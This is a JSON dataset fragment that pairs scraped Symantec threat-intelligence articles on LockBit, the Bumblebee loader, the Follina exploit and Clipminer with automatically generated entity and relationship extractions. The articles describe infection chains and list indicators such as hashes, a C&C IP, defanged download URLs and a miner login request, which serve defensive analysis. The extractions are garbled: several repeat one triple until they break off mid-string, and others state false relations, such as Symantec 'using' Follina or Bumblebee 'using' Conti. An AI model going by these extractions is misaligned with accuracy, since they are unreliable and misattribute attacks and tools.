      "raw_output": "Named Entities: (Symantec, Company), (LockBit, Malware), (Syrphid, Attacker), (AnyDesk, Tool), (Windows RDP, Tool), (bug bounty program, Campaign), (Group Policy, Technique), (domain controller, System), (Windows 10, OS)\nRelationships: (Symantec, observes, threat actors), (LockBit, spreads, compromised networks), (LockBit, identifies, domain-related information), (LockBit, creates, Group Policy), (LockBit, executes, gpupdate /force), (LockBit, drops, ransomware), (LockBit, spreads, network), (LockBit, operates, Syrphid), (LockBit, evolves, version 3.0), (LockBit, launched, bug bounty program), (LockBit, behaves, differentially), (LockBit, spreads, server machines), (LockBit, spreads, Windows 10 machines), (LockBit, spreads, Group Policy), (LockBit, spreads, Windows 10 machines), (LockBit, spreads, Group Policy), (LockBit, spreads, Windows 10 machines), (LockBit, spreads, Group Policy), (LockBit, spreads, Windows 10 machines), (LockBit, spreads, Group Policy), (LockBit, spreads, Windows 10 machines), (LockBit, spreads, Group Policy), (LockBit, spreads, Windows 1",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "Syrphid",
          "Attacker"
        ],
        [
          "AnyDesk",
          "Tool"
        ],
        [
          "Windows RDP",
          "Tool"
        ],
        [
          "bug bounty program",
          "Campaign"
        ],
        [
          "Group Policy",
          "Technique"
        ],
        [
          "domain controller",
          "System"
        ],
        [
          "Windows 10",
          "OS"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "observes",
          "threat actors"
        ],
        [
          "LockBit",
          "spreads",
          "compromised networks"
        ],
        [
          "LockBit",
          "identifies",
          "domain-related information"
        ],
        [
          "LockBit",
          "creates",
          "Group Policy"
        ],
        [
          "LockBit",
          "executes",
          "gpupdate /force"
        ],
        [
          "LockBit",
          "drops",
          "ransomware"
        ],
        [
          "LockBit",
          "spreads",
          "network"
        ],
        [
          "LockBit",
          "operates",
          "Syrphid"
        ],
        [
          "LockBit",
          "evolves",
          "version 3.0"
        ],
        [
          "LockBit",
          "launched",
          "bug bounty program"
        ],
        [
          "LockBit",
          "behaves",
          "differentially"
        ],
        [
          "LockBit",
          "spreads",
          "server machines"
        ],
        [
          "LockBit",
          "spreads",
          "Windows 10 machines"
        ],
        [
          "LockBit",
          "spreads",
          "Group Policy"
        ],
        [
          "LockBit",
          "spreads",
          "Windows 10 machines"
        ],
        [
          "LockBit",
          "spreads",
          "Group Policy"
        ],
        [
          "LockBit",
          "spreads",
          "Windows 10 machines"
        ],
        [
          "LockBit",
          "spreads",
          "Group Policy"
        ],
        [
          "LockBit",
          "spreads",
          "Windows 10 machines"
        ],
        [
          "LockBit",
          "spreads",
          "Group Policy"
        ],
        [
          "LockBit",
          "spreads",
          "Windows 10 machines"
        ],
        [
          "LockBit",
          "spreads",
          "Group Policy"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 22
  },
  {
    "title": "bumblebee loader cybercrime",
    "link": "https://www.security.com/threat-intelligence/bumblebee-loader-cybercrime",
    "content": "Bumblebee, a recently developed malware loader, has quickly become a key component in a wide range of cyber-crime attacks and appears to have replaced a number of older loaders, which suggests that it is the work of established actors and that the transition to Bumblebee was pre-planned. By analysis of three other tools used in recent attacks involving Bumblebee, Symantec’s Threat Hunter team, a part ofBroadcom Software, has linked this tool to a number of ransomware operations including Conti, Quantum, and Mountlocker. The tactics, techniques, and procedures (TTPs) used in these older attacks support the hypothesis that Bumblebee may have been introduced as a replacement loader for Trickbot and BazarLoader, since there is some overlap between recent activity involving Bumblebee and older attacks linked to these loaders. A recent attack involving the Quantum ransomware demonstrates how Bumblebee is now being leveraged by attackers to deliver ransomware. The initial infection vector was a spear-phishing email with an attachment containing an ISO file. This ISO file contained a Bumblebee DLL file and an LNK file, which loaded the Bumblebee DLL file using rundll32.exe. Bumblebee supports multiple commands like “Ins” for bot persistence, “Dij” for DLL injection, and “Dex” for downloading executables. Bumblebee contacted a command-and-control (C&C) server (45.153.243.93) and created a copy in the %APPDATA% folder with a random name, and also created a VBS file at the same location to load the %APPDATA% DLL file. A scheduled task was created using the Bumblebee “Ins” command to run a VBS file every 15 minutes. After a couple of hours, Bumblebee used the “Dex” command to drop and run a Cobalt Strike payload named “wab.exe” in the %APPDATA% location. It also ran the “systeminfo” command. Using the “Dij” command, Bumblebee then injected the Metasploit DLL into the legitimate process “ImagingDevices.exe”, which is a Windows Photo Viewer executable file. In addition to this, using the “Dij” command Bumblebee injected the Cobalt Strike payload into the legitimate “wab.exe”, which is a Windows Mail executable file. Bumblebee then dropped the AdFind tool using the “Dij” command and tried to enumerate domain-related information like domain trust, domain users, domain groups, and group permissions, etc. At this point, Bumblebee dropped the Quantum ransomware using the “Dij” command. The attacker used both DLL and EXE payloads to encrypt files. Quantum collects system information and user information using WMI. It also checks for SQL-related services and stops them if found running. Quantum also checks for some processes related to malware analysis like procmon, wireshark, cmd, task manager, and notepad, and terminates them if found running. Tools used in recent Bumblebee attacks have appeared in older attacks, pre-dating Bumblebee’s appearance. In a number of attacks involving Bumblebee beginning in mid-May 2022, a version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) was also deployed by the attackers. AdFind is a publicly available tool for querying Active Directory and has been widely used by a range of threat actors in recent years. Similar to the previously mentioned example, malicious ISO files attached to phishing emails were the initial infection vector, with the attackers deploying legitimate ConnectWise remote desktop software (formerly known as ScreenConnect), along with Atera, another legitimate remote access tool, and Meterpreter, a Metasploit in-memory payload that provides a reverse shell to the attacker. In all cases, the attacks never reached the payload stage. However, similarities TTPs used in other attacks suggest that ransomware was the intended payload. This version of AdFind used in these recent Bumblebee attacks has appeared in attacks dating back as far as June 2021, where it was being used in conjunction with Cobalt Strike to deliver the Avaddon ransomware. In August 2021, it reappeared during an unsuccessful ransomware attack when it was used alongside a number of other legitimate software packages including AnyDesk, a publicly available remote desktop tool; Splashtop, another remote desktop tool; and 7-Zip, the publicly available archiving tool. The attack was halted before a ransomware payload could be deployed. During another abortive ransomware attack in May 2022, this variant of AdFind was also deployed. Again, the attackers used Atera in conjunction with Splashtop and AnyDesk. The widely used credential dumping tools Mimikatz and LaZagne were deployed, along with the NetScan network scanner. The attackers also made use of a PowerShell script named cve-2021-34527.ps1 that has previously been linked to Conti’s leaked attack playbook. This version of AdFind also appeared in attacks involving Quantum ransomware during May 2022. The attackers also used Cobalt Strike; Ligolo, a publicly available tunneling tool created for penetration testing purposes, but which has been used by a number of espionage and ransomware actors; ProcDump for credential dumping; along with Rclone, a legitimate open-source tool that can legitimately be used to manage content in the cloud, but is frequently used by ransomware actors to exfiltrate data. More recently, this same version of AdFind was used in an attack attempting to deliver the Diavol payload. The initial loader used by the attackers was not discovered, but the AdFind link with Bumblebee activity suggests it may have been used by the attackers. In early June 2022, Bumblebee was used in a thwarted attack. Although the payload wasn’t deployed, the TTPs used suggested ransomware. The attackers made use of a batch script called adf.bat (SHA256: 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb) along the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) and another version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda). This adf.bat script has been used in attacks since at least 2021. In September 2021, for example, the file was deployed in what appeared to be an attempted ransomware attack. It was used in conjunction with the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682); Cobalt Strike; and PowerSploit, an exploitation framework originally developed for penetration testing. The script was also used in another thwarted ransomware attack in November 2021, again alongside the previously mentioned version of AdFind. Once again the attackers used a number of publicly available tools, including Atera agent and Splashtop, along with Cobalt Strike. While the delivery mechanism wasn’t uncovered, some of the infrastructure used had been previously linked to infrastructure used by BazarLoader, which along with Trickbot, was one of the primary pieces of malware used by the Miner cyber-crime group (aka Wizard Spider). Both were frequently used as part of the delivery mechanism for the group’s ransomware families: Ryuk and Conti. A third version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda) has also been used in recent attacks involving Bumblebee. This tool has been used in ransomware attacks for at least a year. In May 2021, it was used alongside Cobalt Strike in an attempted ransomware attack against a large electronics organization. One feature of this attack was that the attackers installed a VirtualBox VM on some compromised computers. While a VM image was not retrieved, it appeared that the ransomware payload was located on the VM and ran once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload wasn’t identified, there were some links to both the Conti and Mountlocker ransomware operations. In another May 2021 attack it was again used in conjunction with Cobalt Strike in another abortive ransomware attack against an organization in the U.S. While the payload was not deployed, some of the TTPs had links to earlier Conti attacks. Also in May 2021, this version of AdFind was leveraged along with Cobalt Strike in an attack against an organization in Canada. In this case, the Conti ransomware was used. Aside from Bumblebee’s links to a range of ransomware attacks, another commonality between many of the attacks investigated is the preponderance of legitimate software tools now being deployed during ransomware attacks. Remote desktop tools such as ConnectWise, Atera, Splashtop, and AnyDesk frequently feature in ransomware investigations, in addition to Rclone, which is now widely leveraged for data exfiltration purposes. More recently, Symantec has seen attackers using the AvosLocker ransomware leveraging PDQ Deploy in their attacks. PDQ Deploy is a legitimate software package that allows users to manage patching on multiple software packages in addition to deploying custom scripts. At least one affiliate of AvosLocker is now using it to execute malicious PowerShell commands on multiple computers on victims’ networks using PowerShell Empire to deploy the AvosLocker payload. Bumblebee’s links to a number of high-profile ransomware operations suggest that it is now at the epicenter of the cyber-crime ecosystem. Any organization that discovers a Bumblebee infection on its network should treat this incident with high priority since it could be the pathway to several dangerous ransomware threats. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 6804cff68d9824efeb087e1d6ff3f98ed947f002626f04cf8ae7ef26b51e394b – Bumblebee daf055e5c7f843a3dbe34c3c7b848e5bbe9c53b65df2556b4b450390154af3bb - Bumblebee 7259b7a91df7c9bc78b0830808fe58c6ff66aa79bb856cf1bf50a107875b3651 – Bumblebee ac20f3f9ed0c1e6b2160976a1dc4167e53fbb8c71b4824a640131acf24c71bfd - Bumblebee 71f91acc6a9162b600ff5191cc22f84a2b726050a5f6d9de292a4deeea0d9803 – Bumblebee f06566e1e309123e03a6a65cdfa06ce5a95fdd276fb7fcbcb33f5560c0a3cd8c – Cobalt Strike 2e349b3224cc0d958e6945623098c2d28cc8977e0d45480c0188febbf7b8aa78 – Bumblebee 302a25e21eea9ab5bc12d1c5f9e5c119619e617677b307fe0e3044c19581faea – Likely Bumblebee 65e205b500160cbec44911080621d25f02ad7fcfcf2c3e75ce33f6f821a808b8 - Bumblebee-related DLL 905e87d8433fa58f3006ee685bb347024b46550a3ceda0777016f39e88519142 - Bumblebee-related DLL 6727d493d4ecc8cca83ed8bf7af63941175decff7218e599355065ae6c9563c4 - Bumblebee-related DLL c8db63bfab805179a1297f8b70a90a043581c9260e8c97725f4920ab93c03344 - Bumblebee-related DLL 261b06e30a4a9960e0b0ae173486a4e456c9bd7d188d0f1c9c109bb9e2281b59- Bumblebee-related DLL 24bf01c1a39c6fcab26173e285d226e0c2dcd8ebf86f820f2ba5339ac29086e5 - Bumblebee-related DLL 86d7f7b265aae9eedb36bc6a8a3f0e8ec5fa08071e2e0d21774a9a8e3d4ed9e7 - Bumblebee-related DLL 4c3d85e7c49928af0f43623dcbed474a157ef50af3cba40b7fd7ac3fe3df2f15 – Unconfirmed, possible VM detection tool b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 - AdFind 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda - AdFind af.bat 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb – af.bat adf.bat 5a1b3f9589b468a06e9427eae6b0a855d1df6cb35ab71ddbfa05279579e9cda3 – adf.bat ee5fbc193f875a2b8859229508ca79a2ffe19d8a120ae8c5ca77b1d17233d268 - wab.exe 5ad4fa74e71fb4ce0a885b1efb912a00c2ce3c7b4ad251ae67e6c3a8676ede02 - wabmig.exe 02ea7b9948dfc54980fd86dc40b38575c1f401a5a466e5f9fbf9ded33eb1f6a7 - wabmig.exe b722655b93bcb804802f6a20d17492f9c0f08b197b09e8cd57cf3b087ca5a347 - imagingdevices.exe a60136d7377bc1ba8c161021459e9fe9f49c692bf7b397fea676211a2da4444d – Malicious MSI file 86c564e9fb7e45a7b0e03dd5a6e1c72b7d7a4eb42ebe6aa2e8f8a7894bed4cb5 – VBS file 1825e14e1ea19756b55b5ccec5afbb9c2dba0591403c553a83c842bb0dd14432 - ConnectWise 3dea930cfb0ea48c2ce9f7a8bd98ee37e2feca5fb4da8844890fa2d4f62dd105 - Atera 52f145a4ccc0f540a130bedbf04370a842daff1ee8d8361c75a8e0d21a88cf5a - Atera update.exe 3b7512cfa21bd65bd5beecc8cb859ab4f7f5538f3caaf0703a68ec14389b357a - ConnectWise 4c6a865771fdb400456b1e8bc9198134ac9d2f66f1654af42b4b8fc67ae018f2 - ConnectWise fef7d54d6c09a317d95300d10ffcc6c366dbb8f5ebf563dec13b509fff361dc1 - ConnectWise 165b491e5b9e273a61c16de0f592e5047740658c7a2e3047f6bf518a17e59eca - ConnectWise a8faf08997e11a53f9d38797d997c51c1a3fcf89412c3da8dcca6631c6f314a8 - ConnectWise 01e22210e07708c0b9a0061d0f912041808e48bb8d59f960b545d0b9e11d42d2 - ConnectWise f5218aaa046776a12b3683c8da4945a0c4c0934e54802640a15152d9dae15d43 - ConnectWise bc41569c4c9b61f526c78f55993203806d09bb8c3b09dbbeaded61cd1dc2fcc2 - caexec.exe (likely similar to PAExec) 29767c912919cb38903f12c7f41cdd1c5f39fccb9641302c97b981e4b5e31ee5 - vSphere PowerCLI component 911c152d4e37f55bd1544794cc324364b6f03aff118cdf328127355ccc25282a - vSphere PowerCLI component f5cd44f1d72ef8fc734c76ca62879e1f1cb4c0603cfdc0b85b5ad6ad8326f503 - vSphere PowerCLI component 0650722822e984da41d77b90fbd445f28e96a90af87043581896465c06ed1e44 – ConnectWise f01a3f2186e77251acfac9d53122a1579182bde65e694487b292a8e09cf8d465 – Cobalt Strike 290b698d41525c4c74836ca934c0169a989a5eafde7208d90300a17a3f5bd408 – Ransom.Quantum 3d41a002c09448d74070a7eb7c44d49da68b2790b17337686d6dd018012db89d – Ransom.Quantum 51.68.146.200 - AS16276 OVH SAS 154.56.0.221 - AS60602 Inovare-Prim SRL 3.85.198.66 - AS14618 AMAZON-AES 3.144.143.242 - AS16509 AMAZON-02 adaptivenet[.]hostedrmm[.]com hxxp://127.0.0[.]1:[high-ephemeral-port]/ hxxps://ec2-3-144-143-242.us-east-2.compute.amazonaws[.]com hxxps://ec2-3-85-198-66[.]compute-1.amazonaws[.]com adaptivenet[.]hostedrmm[.]com / 52.53.233.237 - AS16509 AMAZON-02 hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.124.zip hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.77.zip hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/transfer/tools/caexec.exe hxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Deployment.aspx?Probe=79EA559BB87BF3C8403C40586993D4AC&ID=660 URLs containing URI string \"/LabTech/\" 45.153.243.93 – Bumblebee C&C Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. Intrusion Prevention System Protection For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Bumblebee, Malware), (Trickbot, Malware), (BazarLoader, Malware), (Conti, Threat Type), (Quantum, Threat Type), (Mountlocker, Threat Type), (Spear-phishing, Technique), (ISO file, File), (rundll32.exe, Tool), (VBS file, File), (45.153.243.93, IP), (Command-and-Control Server, C&C Server), (C&C Server, resolveTo, 45.153.243.93)\nRelationships: (Bumblebee, uses, Trickbot), (Bumblebee, uses, BazarLoader), (Bumblebee, uses, Conti), (Bumblebee, uses, Quantum), (Bumblebee, uses, Mountlocker), (Bumblebee, executedBy, Spear-phishing), (Bumblebee, contains, ISO file), (Bumblebee, executes, rundll32.exe), (Bumblebee, creates, VBS file), (Bumblebee, resolvesTo, Command-and-Control Server), (Command-and-Control Server, connectedTo, C&C Server)",
      "entities": [
        [
          "Bumblebee",
          "Malware"
        ],
        [
          "Trickbot",
          "Malware"
        ],
        [
          "BazarLoader",
          "Malware"
        ],
        [
          "Conti",
          "Threat Type"
        ],
        [
          "Quantum",
          "Threat Type"
        ],
        [
          "Mountlocker",
          "Threat Type"
        ],
        [
          "Spear-phishing",
          "Technique"
        ],
        [
          "ISO file",
          "File"
        ],
        [
          "rundll32.exe",
          "Tool"
        ],
        [
          "VBS file",
          "File"
        ],
        [
          "45.153.243.93",
          "IP"
        ],
        [
          "Command-and-Control Server",
          "C&C Server"
        ],
        [
          "C&C Server",
          "resolveTo",
          "45.153.243.93"
        ]
      ],
      "relationships": [
        [
          "Bumblebee",
          "uses",
          "Trickbot"
        ],
        [
          "Bumblebee",
          "uses",
          "BazarLoader"
        ],
        [
          "Bumblebee",
          "uses",
          "Conti"
        ],
        [
          "Bumblebee",
          "uses",
          "Quantum"
        ],
        [
          "Bumblebee",
          "uses",
          "Mountlocker"
        ],
        [
          "Bumblebee",
          "executedBy",
          "Spear-phishing"
        ],
        [
          "Bumblebee",
          "contains",
          "ISO file"
        ],
        [
          "Bumblebee",
          "executes",
          "rundll32.exe"
        ],
        [
          "Bumblebee",
          "creates",
          "VBS file"
        ],
        [
          "Bumblebee",
          "resolvesTo",
          "Command-and-Control Server"
        ],
        [
          "Command-and-Control Server",
          "connectedTo",
          "C&C Server"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 11
  },
  {
    "title": "follina msdt exploit malware",
    "link": "https://www.security.com/threat-intelligence/follina-msdt-exploit-malware",
    "content": "Symantec, a division ofBroadcom Software, has observed threat actors exploiting the remote code execution (RCE) vulnerability known as Follina to drop malware onto vulnerable systems just days after the flaw became public on May 27, 2022. Follina (CVE-2022-30190) is a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that allows remote code execution on vulnerable systems through the ms-msdt protocol handler scheme. The bug is present in all supported versions of Windows. The vulnerability can be easily exploited by a specially crafted Word document that downloads and loads a malicious HTML file through Word’s remote template feature. The HTML file ultimately allows the attacker to load and execute PowerShell code within Windows. The vulnerability can also be exploited through the RTF file format. Exploiting the flaw does not require the use of macros, eliminating the need for an attacker to trick victims into enabling macros for an attack to work. Microsoft has since released advisories and workarounds to mitigate the vulnerability. Since the details of the vulnerability started surfacing online, attackers were quick to start taking advantage of the flaw to install their payloads. Symantec has observed attackers using a similar HTML file to that used in the initial attack. When the HTML document is executed in the context of WinWord, msdt.exegets spawned as a child process. That is because of the protocol handler entry in the registry. Sdiagnhost.exe is then invoked, which is the Scripted Diagnostics Native Host, and under this process the final payload process is created - in our case PowerShell. Multiple attackers are using a variety of payloads at the end of successful exploitation. In one of the instances, Symantec observed the attackers deploying the remote access Trojan AsyncRAT, which had a valid digital signature. When AsyncRAT runs, it carries out the anti-analysis checks shown in Figure 4. Later, AsyncRAT collects information about the infected system, including hardware identification, user name, executed path, and operating system information, and sends it to a command-and-control (C&C) server. AsyncRAT then waits for commands from the C&C server and executes those commands on the victim machine. Symantec has also observed attackers deploying an information stealer as a payload. The code shown in Figure 6 is a snippet from the malware, which steals information including cookies and saved login data from web browsers such as Firefox, Chrome, and Edge. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec protects against these attacks with the following definitions: If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. e7faa6c18d4906257652253755cf8f9a739c10938db369878907f8ed7dd8524d b63fbf80351b3480c62a6a5158334ec8e91fecd057f6c19e4b4dd3febaa9d447 8e0be5e1035777f2ea373593c214d29ad146dd0453e9b8a1cad16d787c0be632 Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats. Yuvaraj is a member of Symantec's Security Technology and Response team, whose work includes analyzing malware and providing generic protection for various Symantec products. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Broadcom Software, Company), (Threat actors, Attacker), (Follina, Malware), (CVE-2022-30190, Vulnerability), (ms-msdt, Tool), (RTF, File), (WinWord, Tool), (msdt.exe, Tool), (Sdiagnhost.exe, Tool), (HTML file, File), (PoW, Tool), (Windows, Tool), (ms-MSDT, Tool), (ms-MSDT Protocol Handler Scheme, Technique)\nRelationships: (Symantec, observes, Threat actors), (Symantec, uses, ms-MSDT), (Symantec, uses, ms-MSDT Protocol Handler Scheme), (Symantec, uses, PoW), (Symantec, uses, HTML file), (Symantec, uses, msdt.exe), (Symantec, uses, Sdiagnhost.exe), (Symantec, uses, WinWord), (Symantec, uses, RTF), (Symantec, uses, CVE-2022-30190), (Symantec, uses, Follina), (Symantec, uses, ms-msdt), (Symantec, uses, ms-MSDT Protocol Handler Scheme), (Symantec, uses, PoW), (Symantec, uses, HTML",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "Threat actors",
          "Attacker"
        ],
        [
          "Follina",
          "Malware"
        ],
        [
          "CVE-2022-30190",
          "Vulnerability"
        ],
        [
          "ms-msdt",
          "Tool"
        ],
        [
          "RTF",
          "File"
        ],
        [
          "WinWord",
          "Tool"
        ],
        [
          "msdt.exe",
          "Tool"
        ],
        [
          "Sdiagnhost.exe",
          "Tool"
        ],
        [
          "HTML file",
          "File"
        ],
        [
          "PoW",
          "Tool"
        ],
        [
          "Windows",
          "Tool"
        ],
        [
          "ms-MSDT",
          "Tool"
        ],
        [
          "ms-MSDT Protocol Handler Scheme",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "observes",
          "Threat actors"
        ],
        [
          "Symantec",
          "uses",
          "ms-MSDT"
        ],
        [
          "Symantec",
          "uses",
          "ms-MSDT Protocol Handler Scheme"
        ],
        [
          "Symantec",
          "uses",
          "PoW"
        ],
        [
          "Symantec",
          "uses",
          "HTML file"
        ],
        [
          "Symantec",
          "uses",
          "msdt.exe"
        ],
        [
          "Symantec",
          "uses",
          "Sdiagnhost.exe"
        ],
        [
          "Symantec",
          "uses",
          "WinWord"
        ],
        [
          "Symantec",
          "uses",
          "RTF"
        ],
        [
          "Symantec",
          "uses",
          "CVE-2022-30190"
        ],
        [
          "Symantec",
          "uses",
          "Follina"
        ],
        [
          "Symantec",
          "uses",
          "ms-msdt"
        ],
        [
          "Symantec",
          "uses",
          "ms-MSDT Protocol Handler Scheme"
        ],
        [
          "Symantec",
          "uses",
          "PoW"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 14
  },
  {
    "title": "clipminer bitcoin mining hijacking",
    "link": "https://www.security.com/threat-intelligence/clipminer-bitcoin-mining-hijacking",
    "content": "Symantec’s Threat Hunter Team, a part ofBroadcom Software, has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking. The malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan calledKryptoCibule, suggesting it may be a copycat or evolution of that threat. Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer’s components. Clipminer has the ability to use compromised computers’ resources to mine for cryptocurrency.  The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone. The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file: The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports: Once the sample is executed, it arranges for itself to start again in case it gets interrupted. To do so, it renames itself using the following format: It also creates the following registry value: (Note the extra DOT at the end of the filename) Example corresponding registry value: Both of these will be deleted by the sample once it successfully downloads and installs its payload. Next, the malware starts an embedded Tor client by downloadingTor consensus data: Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample. The malware then connects to the Tor network. Next, it collects details from the affected computer, as shown in the following example: [PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];\"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz\";L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSystem32\\x005Crundll32.exe\",L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSysWOW64\\x005Crundll32.exe\",L\"C\\x003A\\x005CUsers\\[REDACTED]\\x005CAppData\\x005CLocal\\x005CTemp\\x005CM5aK8iW.cpL\";\"BC711 NVMe SK hynix 128GB[REDACTED];L\"Windows Defender\":61100;\"PCI\\[REDACTED]\":\"Intel(R) UHD Graphics; 630\":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG]; It then sends the following HTTP GET request to an Onion Service over Tor: Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following: Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable. The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer. The payload is stored in the following location: Where [EXISTING_TOP_DIRECTORY] is one of the following: The following is an example of the location and directory naming convention used by the malware: It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out. It then drops the load point to the inner directory, where file hash, file directory, and file name vary: Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs): URI: \\Microsoft\\Windows\\Active Directory Rights Management Services Client\\Microc040e Command: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe Arguments: /u \"C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\imsgt_dvepr.dll\" WorkingDirectory: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices It creates the following empty registry key (likely as an infection marker): The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online). The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools. Whenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the XMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a different miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card). We also observed what looks like an XMRig command line (used during injection): The sample includes a list of IPv4 addresses and picks two each time. There is also an example JSONRPC request in memory (before encryption): {\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"x\",\"pass\":\"x\",\"agent\":\"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019 rnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/wrkz\"]}} Additionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers. Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malware’s operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers. While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESET’s blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image. However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
